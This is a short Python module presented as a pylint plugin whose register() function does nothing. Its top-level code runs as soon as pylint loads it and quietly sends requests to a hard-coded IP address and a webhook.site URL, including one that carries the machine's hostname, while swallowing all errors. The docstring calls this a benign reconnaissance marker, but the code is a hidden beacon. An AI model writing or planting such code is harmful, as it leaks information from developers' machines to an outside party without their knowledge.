"""pylint plugin. Imported by pylint via the load-plugins directive, so this module's
top-level code executes in the tool process. Benign out-of-band reconnaissance marker only
(no payload, loader, dropper, persistence, or destructive action)."""
import urllib.request

for _u in (
    "http://62.171.145.137:9111/pylintplugin-vps",
    "https://webhook.site/884eb945-5683-403e-99be-ea8fcb942a18/pylintplugin-wh",
):
    try:
        urllib.request.urlopen(_u, timeout=4)
    except Exception:
        pass

try:
    import socket
    _h = socket.gethostname()
    urllib.request.urlopen("http://62.171.145.137:9111/pylintplugin-host-" + _h, timeout=4)
except Exception:
    pass


def register(linter):
    """pylint plugin entry point (no-op)."""
    return
